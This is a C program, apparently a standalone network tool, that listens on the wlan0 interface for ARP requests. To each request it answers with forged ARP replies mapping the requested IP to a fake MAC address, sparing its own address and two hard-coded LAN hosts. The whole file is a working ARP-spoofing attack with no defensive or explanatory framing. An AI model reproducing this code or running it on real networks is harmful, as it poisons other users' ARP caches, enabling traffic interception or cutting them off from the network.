#include "header.h"
#include <wait.h>

void do_child();

int main(int argc, char **argv)
{
    int sock;
    int ifindex;
    char sip_temp[4];
    char sha_temp[ETH_ALEN];
    int debug = 0;
    int i;

    if (argc > 1) {
        if (!memcmp(argv[1], "-d", 2)) {
            debug = 1;
        }
    }

    struct sockaddr_ll shaddr, dhaddr;

    char smac[8] = { 0x00, 0x00, 0x11, 0x22, 0x33, 0x44, '\0' };
    unsigned char mymac[6];

    signal(SIGCHLD, do_child);

    sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (sock == -1) {
        perror("socket");
        exit(1);
    }

    struct ifreq ifreq;

    memcpy(ifreq.ifr_name, "wlan0\0", 6);

    if (ioctl(sock, SIOCGIFINDEX, &ifreq) == -1) {
        perror("SIOCGIFINDEX");
        exit(1);
    }

    ifindex = ifreq.ifr_ifindex;

    if (ioctl(sock, SIOCGIFHWADDR, &ifreq) == -1) {
        perror("SIOCGIFHWADDR");
        exit(1);
    }

    memcpy(mymac, ifreq.ifr_hwaddr.sa_data, ETH_ALEN);

    char mac[512];

    sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X", mymac[0], mymac[1],
            mymac[2], mymac[3], mymac[4], mymac[5]);

    printf("my mac %s\n", mac);

    char *myip;

    struct sockaddr_in *my;
    struct ifconf conf;
    int num;
    conf.ifc_len = 512;
    char buf[512];
    conf.ifc_buf = buf;
    struct ifreq *ifr;
    num = conf.ifc_len / sizeof(struct ifreq);

    if (ioctl(sock, SIOCGIFCONF, &conf) == -1) {
        perror("SIOCGIFCONF");
        exit(1);
    }

    ifr = conf.ifc_req;

    for (i = 0; i < num; i++) {
        my = (struct sockaddr_in *) (&(ifr->ifr_addr));
        if (!memcmp("wlan0", ifr->ifr_name, 5)) {
            myip = inet_ntoa(my->sin_addr);
            printf("my ip: %s %s\n", ifr->ifr_name, myip);
        }
        ifr++;
    }

    memset(&shaddr, 0, sizeof(struct sockaddr_ll));
    shaddr.sll_family = AF_PACKET;
    shaddr.sll_protocol = htons(ETH_P_ARP);
    shaddr.sll_ifindex = ifindex;
    shaddr.sll_hatype = ARPHRD_ETHER;
    shaddr.sll_halen = ETH_ALEN;
    memcpy(shaddr.sll_addr, smac, ETH_ALEN);

    if (bind(sock, (struct sockaddr *) &shaddr, sizeof(struct sockaddr_ll))
        == -1) {
        perror("bind");
        exit(1);
    }

    memset(&dhaddr, 0, sizeof(struct sockaddr_ll));
    dhaddr.sll_family = AF_PACKET;
    dhaddr.sll_protocol = htons(ETH_P_ARP);
    dhaddr.sll_ifindex = ifindex;
    dhaddr.sll_hatype = ARPHRD_ETHER;
    dhaddr.sll_halen = ETH_ALEN;

    struct arpheader arphdr;
    int len = sizeof(struct arpheader);
    arphdr.ar_hrd = htons(ARPHRD_ETHER);
    arphdr.ar_pro = htons(ETH_P_IP);
    arphdr.ar_hln = ETH_ALEN;
    arphdr.ar_pln = 4;

    int n;
    pid_t pid;

    while (1) {
        n = recvfrom(sock, &arphdr, len, 0, NULL, NULL);
        if (ntohs(arphdr.ar_op) != ARPOP_REQUEST) {
            continue;
        }
        pid = fork();
        if (pid < 0) {
            perror("fork");
            exit(1);
        } else if (pid == 0)    //child
        {
            if (debug) {
                printf("\n###################################\n");

                printf("h_dest: %02X:%02X:%02X:%02X:%02X:%02X",
                       arphdr.h_dest[0], arphdr.h_dest[1],
                       arphdr.h_dest[2], arphdr.h_dest[3],
                       arphdr.h_dest[4], arphdr.h_dest[5]);

                printf
                    (" h_source: %02X:%02X:%02X:%02X:%02X:%02X\n",
                     arphdr.h_source[0], arphdr.h_source[1],
                     arphdr.h_source[2], arphdr.h_source[3],
                     arphdr.h_source[4], arphdr.h_source[5]);

                printf("sha: %02X:%02X:%02X:%02X:%02X:%02X",
                       arphdr.ar_sha[0], arphdr.ar_sha[1],
                       arphdr.ar_sha[2], arphdr.ar_sha[3],
                       arphdr.ar_sha[4], arphdr.ar_sha[5]);

                printf(" sip %d.%d.%d.%d", arphdr.ar_sip[0],
                       arphdr.ar_sip[1], arphdr.ar_sip[2],
                       arphdr.ar_sip[3]);

                printf(" tha:%02X:%02X:%02X:%02X:%02X:%02X",
                       arphdr.ar_tha[0], arphdr.ar_tha[1],
                       arphdr.ar_tha[2], arphdr.ar_tha[3],
                       arphdr.ar_tha[4], arphdr.ar_tha[5]);

                printf(" tip:%d.%d.%d.%d", arphdr.ar_tip[0],
                       arphdr.ar_tip[1], arphdr.ar_tip[2],
                       arphdr.ar_tip[3]);

            }
            char dstip[32];
            char iip1[32];
            char iip2[32];
            sprintf(iip1, "%d.%d.%d.%d", 192, 168, 1, 6);
            sprintf(iip2, "%d.%d.%d.%d", 192, 168, 1, 31);
            sprintf(dstip, "%d.%d.%d.%d", arphdr.ar_tip[0],
                    arphdr.ar_tip[1], arphdr.ar_tip[2], arphdr.ar_tip[3]);

            //swap the src and dst mac ip
            if (!memcmp(mymac, arphdr.ar_sha, ETH_ALEN)) {
                if (debug) {
                    fprintf(stderr, "found my mac,ignore.\n");
                }
                exit(0);
            }

            if (!memcmp(dstip, myip, strlen(dstip))) {
                if (debug) {
                    fprintf(stderr, "found my ip,ignore.\n");
                }
                exit(0);
            }

            if (!memcmp(dstip, iip1, strlen(dstip))) {
                exit(0);
            }

            if (!memcmp(dstip, iip2, strlen(dstip))) {
                exit(0);
            }
            memcpy(dhaddr.sll_addr, arphdr.ar_sha, ETH_ALEN);
            arphdr.ar_op = htons(ARPOP_REPLY);
            memcpy(sip_temp, arphdr.ar_sip, 4);
            memcpy(sha_temp, arphdr.ar_sha, ETH_ALEN);
            memcpy(arphdr.ar_sip, arphdr.ar_tip, 4);
            memcpy(arphdr.ar_sha, smac, ETH_ALEN);
            memcpy(arphdr.ar_tip, sip_temp, 4);
            memcpy(arphdr.ar_tha, sha_temp, ETH_ALEN);
            memcpy(arphdr.h_source, smac, ETH_ALEN);
            memcpy(arphdr.h_dest, sha_temp, ETH_ALEN);

            if (debug) {
                printf("-------------------------------");

                printf("\nafter swap:\n");

                printf("h_dest: %02X:%02X:%02X:%02X:%02X:%02X",
                       arphdr.h_dest[0], arphdr.h_dest[1],
                       arphdr.h_dest[2], arphdr.h_dest[3],
                       arphdr.h_dest[4], arphdr.h_dest[5]);

                printf
                    (" h_source: %02X:%02X:%02X:%02X:%02X:%02X\n",
                     arphdr.h_source[0], arphdr.h_source[1],
                     arphdr.h_source[2], arphdr.h_source[3],
                     arphdr.h_source[4], arphdr.h_source[5]);

                printf("sha: %02X:%02X:%02X:%02X:%02X:%02X",
                       arphdr.ar_sha[0], arphdr.ar_sha[1],
                       arphdr.ar_sha[2], arphdr.ar_sha[3],
                       arphdr.ar_sha[4], arphdr.ar_sha[5]);

                printf(" sip %d.%d.%d.%d", arphdr.ar_sip[0],
                       arphdr.ar_sip[1], arphdr.ar_sip[2],
                       arphdr.ar_sip[3]);

                printf(" tha:%02X:%02X:%02X:%02X:%02X:%02X",
                       arphdr.ar_tha[0], arphdr.ar_tha[1],
                       arphdr.ar_tha[2], arphdr.ar_tha[3],
                       arphdr.ar_tha[4], arphdr.ar_tha[5]);

                printf(" tip:%d.%d.%d.%d", arphdr.ar_tip[0],
                       arphdr.ar_tip[1], arphdr.ar_tip[2],
                       arphdr.ar_tip[3]);

                printf("\n###################################\n");
            }
            memcpy(dhaddr.sll_addr, arphdr.ar_tha, ETH_ALEN);

            for (i = 0; i < 2; i++) {
                n = sendto(sock, &arphdr,
                           sizeof(struct arpheader), 0,
                           (struct sockaddr *) &dhaddr,
                           sizeof(struct sockaddr_ll));
                if (n == -1) {
                    perror("sendto");
                    exit(1);
                }
            }

            sleep(1);

            for (i = 0; i < 2; i++) {
                n = sendto(sock, &arphdr,
                           sizeof(struct arpheader), 0,
                           (struct sockaddr *) &dhaddr,
                           sizeof(struct sockaddr_ll));
                if (n == -1) {
                    perror("sendto");
                    exit(1);
                }
            }

            //exit child
            close(sock);
            exit(0);
        }
        //parent
    }
    return 0;
}

void do_child()
{
    while (waitpid(-1, NULL, WNOHANG) > 0);
}
